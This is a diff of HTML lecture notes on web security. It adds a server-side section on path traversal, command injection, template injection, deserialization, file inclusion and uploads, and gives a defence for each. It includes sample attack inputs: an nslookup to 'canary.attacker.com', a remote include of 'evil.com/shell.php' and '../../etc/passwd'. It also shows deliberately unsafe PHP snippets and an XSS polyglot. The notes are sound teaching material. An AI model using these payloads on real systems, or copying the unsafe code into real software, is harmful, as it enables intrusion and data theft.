@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <title>Web Security</title>
-<!-- 2024-05-18 Sat 10:14 -->
+<!-- 2024-05-21 Tue 16:37 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="generator" content="Org-mode">
@@ -285,6 +285,16 @@ MathJax.Hub.Config({
 <li><a href="#sec-8-1">8.1. Mixed Content Policy</a></li>
 <li><a href="#sec-8-2">8.2. CSP to TLS enforcement</a></li>
 <li><a href="#sec-8-3">8.3. HTTP Strict Transport Security (HSTS)</a></li>
+</ul>
+</li>
+<li><a href="#sec-9">9. Server-side security</a>
+<ul class="nav">
+<li><a href="#sec-9-1">9.1. Path traversal</a></li>
+<li><a href="#sec-9-2">9.2. Command injection</a></li>
+<li><a href="#sec-9-3">9.3. Templates</a></li>
+<li><a href="#sec-9-4">9.4. Insecure deserialization</a></li>
+<li><a href="#sec-9-5">9.5. File inclusion</a></li>
+<li><a href="#sec-9-6">9.6. Unrestricted File Upload</a></li>
 </ul>
 </li>
 </ul>
@@ -705,7 +715,7 @@ A polyglot is an exploit working in several different contexts:
 </p>
 <div class="org-src-container">
 
-<pre class="src src-javascript">javascript:alert()<span style="color: #a89984;">//</span><span style="color: #a89984;">"){}alert();//&lt;/a&gt;&lt;script&gt;alert()&lt;/script&gt;</span>
+<pre class="src src-javascript">javascript:alert()<span style="color: #928374;">//</span><span style="color: #928374;">"){}alert();//&lt;/a&gt;&lt;script&gt;alert()&lt;/script&gt;</span>
 </pre>
 </div>
 </div>
@@ -889,7 +899,7 @@ nonce can be used for many inline scripts):
 </p>
 <div class="org-src-container">
 
-<pre class="src src-html">&lt;<span style="color: #b57614;">script</span> <span style="color: #076678;">nonce</span>=<span style="color: #79740e;">"54321"</span>&gt; alert(1); &lt;/<span style="color: #b57614;">script</span>&gt;
+<pre class="src src-html">&lt;<span style="color: #b8bb26;">script</span> <span style="color: #83a598;">nonce</span>=<span style="color: #b8bb26;">"54321"</span>&gt; alert(1); &lt;/<span style="color: #b8bb26;">script</span>&gt;
 </pre>
 </div>
 
@@ -937,7 +947,7 @@ SHA-512 hash of its body is YWIzOWNiNzJjNDRlY:
 </p>
 <div class="org-src-container">
 
-<pre class="src src-html">&lt;<span style="color: #b57614;">script</span>&gt; alert(1); &lt;/<span style="color: #b57614;">script</span>&gt;
+<pre class="src src-html">&lt;<span style="color: #b8bb26;">script</span>&gt; alert(1); &lt;/<span style="color: #b8bb26;">script</span>&gt;
 </pre>
 </div>
 
@@ -1245,7 +1255,7 @@ Message reception:
 </p>
 <div class="org-src-container">
 
-<pre class="src src-javascript">window.addEventListener(<span style="color: #79740e;">"message"</span>, receiveMessage);
+<pre class="src src-javascript">window.addEventListener(<span style="color: #b8bb26;">"message"</span>, receiveMessage);
 </pre>
 </div>
 </div>
@@ -1333,9 +1343,9 @@ It is possible to relax individual security restrictions:
 </p>
 <div class="org-src-container">
 
-<pre class="src src-html">&lt;<span style="color: #b57614;">iframe</span> <span style="color: #076678;">src</span>=<span style="color: #79740e;">"https://platform.twitter.com/tweet_button.html"</span>
-        <span style="color: #076678;">sandbox</span>=<span style="color: #79740e;">"allow-same-origin allow-scripts</span>
-<span style="color: #79740e;">                 allow-popups allow-forms"</span>/&gt;
+<pre class="src src-html">&lt;<span style="color: #b8bb26;">iframe</span> <span style="color: #83a598;">src</span>=<span style="color: #b8bb26;">"https://platform.twitter.com/tweet_button.html"</span>
+        <span style="color: #83a598;">sandbox</span>=<span style="color: #b8bb26;">"allow-same-origin allow-scripts</span>
+<span style="color: #b8bb26;">                 allow-popups allow-forms"</span>/&gt;
 </pre>
 </div>
 </div>
@@ -1838,10 +1848,280 @@ to at least 1 year and includeSubDomains;
 </div>
 </div>
 </div>
+<div id="outline-container-sec-9" class="outline-2">
+<h2 id="sec-9"><span class="section-number-2">9</span> Server-side security</h2>
+<div class="outline-text-2" id="text-9">
+</div><div id="outline-container-sec-9-1" class="outline-3">
+<h3 id="sec-9-1"><span class="section-number-3">9.1</span> Path traversal</h3>
+<div class="outline-text-3" id="text-9-1">
+<p>
+Path traversal is a well-known web security vulnerability which allows the
+attacker to <b>read arbitrary files from the web server</b>.
+</p>
+
+<p>
+Path traversal is typically presented as an attack against confidentiality, but
+it can also be used to break integrity: <b>By uploading a file with name
+../index.php</b>, the attacker might be able to take full control of the web
+application logic!
+</p>
+</div>
+<div id="outline-container-sec-9-1-1" class="outline-4">
+<h4 id="sec-9-1-1"><span class="section-number-4">9.1.1</span> Protecting against path traversal</h4>
+<div class="outline-text-4" id="text-9-1-1">
+<p>
+Like for most injection vulnerabilities, the most important rule to keep in mind
+against path traversal is: don’t do it by yourself!
+</p>
+<ul class="org-ul">
+<li>use an existing API to <b>canonicalize the filename</b>, i.e., to uniquely resolve it
+into an absolute path
+</li>
+<li>perform the security checks over the canonicalized filename, e.g., <b>check that
+it starts with the expected base directory</b>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-9-2" class="outline-3">
+<h3 id="sec-9-2"><span class="section-number-3">9.2</span> Command injection</h3>
+<div class="outline-text-3" id="text-9-2">
+<p>
+Command injection is an infamous web security vulnerability which allows the
+attacker to execute <b>arbitrary OS commands on the server</b>.
+</p>
+
+<p>
+Since command injection leverages a call to an OS command, most of the times the
+attacker is forced to <b>play blind</b>. In particular, the following side-channels are
+useful to identify room for command injection:
+</p>
+<ol class="org-ol">
+<li><b>time delays</b>, e.g., ping -c 10 127.0.0.1
+</li>
+<li><b>output redirection</b>, e.g., whoami &gt; /var/www/static/whoami.txt
+</li>
+<li><b>DNS resolution</b>, e.g., nslookup canary.attacker.com
+</li>
+</ol>
+</div>
+<div id="outline-container-sec-9-2-1" class="outline-4">
+<h4 id="sec-9-2-1"><span class="section-number-4">9.2.1</span> Preventing Command injection</h4>
+<div class="outline-text-4" id="text-9-2-1">
+<p>
+The best way to defend against command injection is to avoid calls to external
+OS commands:
+</p>
+<ul class="org-ul">
+<li>Most of the times, you can use <b>application-level libraries</b> for the same task:
+this is generally more secure;
+</li>
+<li>If this is not possible, <b>sanitize your input by using existing libraries</b>,
+e.g., shlex.quote in Python escapes shell metacharacters;
+</li>
+<li><b>Separate commands from parameters by using the APIs</b> of your programming
+language, e.g., subprocess.run in Python
+</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-9-3" class="outline-3">
+<h3 id="sec-9-3"><span class="section-number-3">9.3</span> Templates</h3>
+<div class="outline-text-3" id="text-9-3">
+<p>
+Server-side programming languages often use templates: Templates might suffer
+from <b>XSS vulnerabilities</b>, though web frameworks often provide auto-escaping
+features.
+</p>
+
+<p>
+If the attacker is able to provide inputs which get rendered as a template, the
+application suffers from a server-side template injection vulnerability.
+</p>
+
+<p>
+Unsafe example: rendering a welcome message from a custom template
+</p>
+<div class="org-src-container">
+
+<pre class="src src-php">$output = $twig-&gt;render($_GET[’custom_message’],
+              array("first_name" =&gt; $user.first_name) );
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-9-4" class="outline-3">
+<h3 id="sec-9-4"><span class="section-number-3">9.4</span> Insecure deserialization</h3>
+<div class="outline-text-3" id="text-9-4">
+<blockquote>
+<p>
+<b>Serialization</b>: The process of converting complex data structures into a “flat”
+ format, amenable for network communication or storage.
+</p>
+</blockquote>
+
+<p>
+Deserialization turns a serialized object back into its original state:
+</p>
+<ul class="org-ul">
+<li>dangerous when this involves <b>user-controlled</b> data
+</li>
+<li>damage can be done even before deserialization is finished, e.g., exceptions
+leading to DoS or abuse of magic methods like wakeup
+</li>
+<li>weakly typed programming languages are particularly at risk, yet strong typing
+only mitigates the issue
+</li>
+</ul>
+</div>
+<div id="outline-container-sec-9-4-1" class="outline-4">
+<h4 id="sec-9-4-1"><span class="section-number-4">9.4.1</span> Example</h4>
+<div class="outline-text-4" id="text-9-4-1">
+<div class="org-src-container">
+
+<pre class="src src-php">$login = unserialize($_COOKIE["auth"])
+if ($login[’password’] == $password) {
+  // log in successfully
+}
+</pre>
+</div>
+
+<p>
+This allows authentication bypasses, due to subtle ingredients:
+</p>
+<ul class="org-ul">
+<li>the loose comparison operator == can equate two elements with different types
+</li>
+<li>we have 0 == &ldquo;Any string not starting with numbers&rdquo;
+</li>
+<li>this only works when the serialized object contains 0 as integer, not
+</li>
+</ul>
+<p>
+as string
+</p>
+</div>
+</div>
+<div id="outline-container-sec-9-4-2" class="outline-4">
+<h4 id="sec-9-4-2"><span class="section-number-4">9.4.2</span> Impact and defenses</h4>
+<div class="outline-text-4" id="text-9-4-2">
+<p>
+Insecure deserialization may have dangerous consequences:
+</p>
+<ol class="org-ol">
+<li>remote code execution;
+</li>
+<li>privilege escalation and authentication bypasses
+</li>
+<li>denial of service
+</li>
+<li>data-only attacks
+</li>
+</ol>
+
+<p>
+To prevent insecure deserialization:
+</p>
+<ul class="org-ul">
+<li><b>do not serialize user-controlled data</b>!
+</li>
+<li>if you really need to do that, sign the serialized data and <b>check their
+integrity</b> before attempting deserialization
+</li>
+<li>do not serialize objects: use pure data format like <b>JSON</b>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-9-5" class="outline-3">
+<h3 id="sec-9-5"><span class="section-number-3">9.5</span> File inclusion</h3>
+<div class="outline-text-3" id="text-9-5">
+<p>
+A file inclusion vulnerability happens when a web application includes
+server-side code without appropriate sanitization. We will discuss this in the
+context of PHP, but other languages like JSP are also vulnerable.
+</p>
+
+<pre class="example">
+https://foo.com/index.php?page=contacts.php
+</pre>
+
+<p>
+Malicious usages:
+</p>
+<ul class="org-ul">
+<li>Denial of service: ?page=index.php
+</li>
+<li>Remote file inclusion: ?page=<a href="https://evil.com/shell.php">https://evil.com/shell.php</a>
+</li>
+<li>Local file inclusion: ?page=/uploads/shell.php
+</li>
+<li>Data exfiltration: ?page=../../etc/passwd
+</li>
+</ul>
+</div>
+<div id="outline-container-sec-9-5-1" class="outline-4">
+<h4 id="sec-9-5-1"><span class="section-number-4">9.5.1</span> Preventing File Inclusion Vulnerabilities</h4>
+<div class="outline-text-4" id="text-9-5-1">
+<p>
+The best solution against file inclusion vulnerabilities is to use a whitelist
+of allowed resources for inclusion.
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-sec-9-6" class="outline-3">
+<h3 id="sec-9-6"><span class="section-number-3">9.6</span> Unrestricted File Upload</h3>
+<div class="outline-text-3" id="text-9-6">
+<p>
+Uploaded files represent a significant risk to web apps: after uploading code,
+the attacker only needs to find a way to get it executed.
+</p>
+
+<p>
+It might be surprising to realize that many files are dangerous:
+</p>
+<ul class="org-ul">
+<li>HTML: enabler for persistent XSS
+</li>
+<li>SVG: supports inline JavaScript
+</li>
+</ul>
+</div>
+<div id="outline-container-sec-9-6-1" class="outline-4">
+<h4 id="sec-9-6-1"><span class="section-number-4">9.6.1</span> Preventing UFU</h4>
+<div class="outline-text-4" id="text-9-6-1">
+<p>
+Unrestricted file upload is complicated to deal with, hence also difficult to
+detect automatically:
+</p>
+<ol class="org-ol">
+<li>sanitize the content of the filename (for application integrity)
+</li>
+<li>file extensions cannot be trusted, but white-listing them is useful because
+some programs require specific extensions to operate
+</li>
+<li>check / sanitize / re-encode the content of the uploaded files
+</li>
+<li>restrict upload operations to authenticated users
+</li>
+<li>put the uploaded files out of the webroot / on an external domain, so that
+SOP can provide protection
+</li>
+<li>put a limit on the file size to avoid denial of service.
+</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
 </div></div></div>
 <footer id="postamble" class="">
 <div><p class="author">Author: Pietro Visconti</p>
-<p class="date">Created: 2024-05-18 Sat 10:14</p>
+<p class="date">Created: 2024-05-21 Tue 16:37</p>
 <p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 29.3 (<a href="http://orgmode.org">Org-mode</a> 9.7)</p>
 </div>
 </footer>
